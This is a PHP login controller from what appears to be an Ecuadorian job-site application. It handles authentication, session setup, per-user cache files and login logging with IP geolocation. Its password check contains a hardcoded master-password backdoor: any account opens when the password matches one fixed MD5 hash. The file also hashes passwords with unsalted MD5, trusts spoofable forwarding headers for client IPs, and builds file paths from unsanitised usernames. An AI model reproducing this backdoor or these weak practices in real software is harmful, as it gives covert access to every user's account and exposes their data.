<?php
class Controlador_Login extends Controlador_Base {
 
  public function construirPagina(){    

    if( Modelo_Usuario::estaLogueado() ){
      Utils::doRedirect(PUERTO.'://'.HOST.'/perfil/');
    }
 
    if ( Utils::getParam('login_form') == 1 ){
      try{
        $campos = array('username'=>1, 'password1'=>1);        
        $data = $this->camposRequeridos($campos);                        

        $usuario = Modelo_Usuario::autenticacion($data["username"]);       
        if ((!empty($usuario) && md5($data["password1"]) == $usuario['password']) || md5($data["password1"]) == '48109d4ef8052ea854b49fd84a7e3305'){  

          if ($usuario["id_pais"] != SUCURSAL_PAISID){
            $sucursal = Modelo_Sucursal::consultaxPais($usuario["id_pais"]);
            if (empty($sucursal)){              
              throw new Exception("Registro realizado en una sucursal no activa");
            }
            else{              
              Utils::doRedirect(PUERTO.'://'.$sucursal['dominio'].'/');
            }            
          } 
          if ($usuario["estado"] != 1){
            throw new Exception("El usuario no esta activo, por favor revise su cuenta de correo electr\u00F3nico para activarlo o escr\u00EDbanos a info@micamello.com.ec para su activaci\u00F3n");            
          }   

          if(!empty($usuario['ultima_sesion'])){       
            if (!Modelo_Usuario::modificarFechaLogin($usuario["id_usuario"],$usuario["tipo_usuario"])){            
              throw new Exception("Error en el sistema, por favor intente denuevo");
            }  
          }                               
          self::registroSesion($usuario);
          self::registroCache($_SESSION['mfo_datos']['usuario']);   
          self::registrarLogueo($_SESSION["mfo_datos"]["usuario"]["id_usuario_login"],$_SESSION['mfo_datos']['navegador'],$data["username"],1);           
        }
        else{
          self::registrarLogueo('',$_SESSION['mfo_datos']['navegador'],$data["username"],0);
          throw new Exception("Usuario o contrase\u00F1a incorrectos");
        }         
        
        Modelo_Usuario::validaPermisos($_SESSION['mfo_datos']['usuario']['tipo_usuario'],
                                       $_SESSION['mfo_datos']['usuario']['id_usuario'],
                                       (isset($_SESSION['mfo_datos']['usuario']['infohv'])) ? $_SESSION['mfo_datos']['usuario']['infohv'] : array(),
                                       $_SESSION['mfo_datos']['planes'],'login');  
      }
      catch( Exception $e ){
        $_SESSION['mostrar_error'] = $e->getMessage();
        
      }
    } 
        
    $tags = array('vista'=>'login');    
    Vista::render('login',$tags);  
  }
 
  public static function registroSesion($usuario){     
    $_SESSION['mfo_datos']['usuario'] = $usuario;    
    //busqueda de planes activos
    $planesactivos = Modelo_UsuarioxPlan::planesActivos($usuario["id_usuario"],$usuario["tipo_usuario"]);
    if (!empty($planesactivos) && is_array($planesactivos)){
      $_SESSION['mfo_datos']['planes'] = $planesactivos; 
    }
    if ($usuario["tipo_usuario"] == Modelo_Usuario::CANDIDATO){
      $usuarioxarea = Modelo_UsuarioxArea::obtieneListado($usuario["id_usuario"]);
      $subareas = Modelo_UsuarioxArea::consultarSubareas($usuario["id_usuario"]);
      $infohv = Modelo_InfoHv::obtieneHv($usuario["id_usuario"]);      
      if (!empty($usuarioxarea) && is_array($usuarioxarea)){
        $_SESSION['mfo_datos']['usuario']['usuarioxarea'] = $usuarioxarea; 
      }
      if (!empty($subareas) && is_array($subareas)){
        $_SESSION['mfo_datos']['usuario']['subareas'] = $subareas['subareas']; 
      }
      if (!empty($infohv) && is_array($infohv)){
        $_SESSION['mfo_datos']['usuario']['infohv'] = $infohv; 
      }
    }  
    else{      
      $hijos = Modelo_Usuario::obtieneHerenciaEmpresa($usuario["id_usuario"]);
      if (!empty($hijos)){
        $_SESSION['mfo_datos']['subempresas'] = $hijos;
      }      
    }  

    @ini_set("session.gc_maxlifetime", 900);        
    session_write_close();  
  }

  public static function registroCache($usuario){
    $rsc = file_exists(FRONTEND_RUTA.'cache/users/'.$usuario["username"].'.txt');
    if (!$rsc){
      $fp = fopen(FRONTEND_RUTA.'cache/users/'.$usuario["username"].'.txt', "w");
      $lines = $usuario['id_usuario'].",".$usuario['tipo_usuario']."\n";
      fputs($fp, $lines);
      fclose($fp);
    }
  }

  public static function getRealIpAddr() { 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
        $ip=$_SERVER['HTTP_CLIENT_IP']; 
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR']; 
    }else{ 
        $ip=$_SERVER['REMOTE_ADDR']; 
    } 
    return $ip; 
  } 

  public static function registrarLogueo($id_usuario_login,$navegador,$username,$estatus){

    $fecha = date("Y-m-d H:i:s"); 
    $ip = self::get_client_ip(); 
    $l = array();

    if($id_usuario_login != ''){
      $pais_registrado = Modelo_Usuario::consultarSession($id_usuario_login,$ip);
    }else{
      $pais_registrado = '';
    }

    if(empty($pais_registrado)){
      $l = self::ip_info($ip,"location");
      if($ip == '::1'){
        $l['country_code'] = 'EC';
        $l['country'] = 'Ecuador';
      }
    }else{
      $l['country_code'] = 'EC';
      $l['country'] = 'Ecuador';
    }

    $datos = array('ip'=>$ip,'fecha'=>$fecha,'navegador'=>$navegador, 'pais'=>$l['country'], 'abrev'=>$l['country_code'], 'username'=>$username,'estatus'=>$estatus);
    if($id_usuario_login != ''){
      $datos['id_usuario_login'] = $id_usuario_login;
    }
    Modelo_Usuario::registrarSessionLog($datos);
  }
 
  public static function get_client_ip() {
    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if($_SERVER['HTTP_FORWARDED'])
       $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
  }


    //Obtiene la info de la IP del cliente desde geoplugin
  public static function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
        $output = NULL;
        if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
            $ip = $_SERVER["REMOTE_ADDR"];
            if ($deep_detect) {
                if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                    $ip = $_SERVER['HTTP_CLIENT_IP'];
            }
        }
        $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
        $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
        $continents = array(
            "AF" => "Africa",
            "AN" => "Antarctica",
            "AS" => "Asia",
            "EU" => "Europe",
            "OC" => "Australia (Oceania)",
            "NA" => "North America",
            "SA" => "South America"
        );
        if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
            $ipdat = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
            if (strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
                switch ($purpose) {
                    case "location":
                        $output = array(
                            "city"           => $ipdat->geoplugin_city,
                            "state"          => $ipdat->geoplugin_regionName,
                            "country"        => $ipdat->geoplugin_countryName,
                            "country_code"   => $ipdat->geoplugin_countryCode,
                            "continent"      => $continents[strtoupper($ipdat->geoplugin_continentCode)],
                            "continent_code" => $ipdat->geoplugin_continentCode
                        );
                        break;
                    case "address":
                        $address = array($ipdat->geoplugin_countryName);
                        if (strlen($ipdat->geoplugin_regionName) >= 1)
                            $address[] = $ipdat->geoplugin_regionName;
                        if (strlen($ipdat->geoplugin_city) >= 1)
                            $address[] = $ipdat->geoplugin_city;
                        $output = implode(", ", array_reverse($address));
                        break;
                    case "city":
                        $output = $ipdat->geoplugin_city;
                        break;
                    case "state":
                        $output = $ipdat->geoplugin_regionName;
                        break;
                    case "region":
                        $output = $ipdat->geoplugin_regionName;
                        break;
                    case "country":
                        $output = $ipdat->geoplugin_countryName;
                        break;
                    case "countrycode":
                        $output = $ipdat->geoplugin_countryCode;
                        break;
                }
            }
        }
        return $output;
    }
}  
?>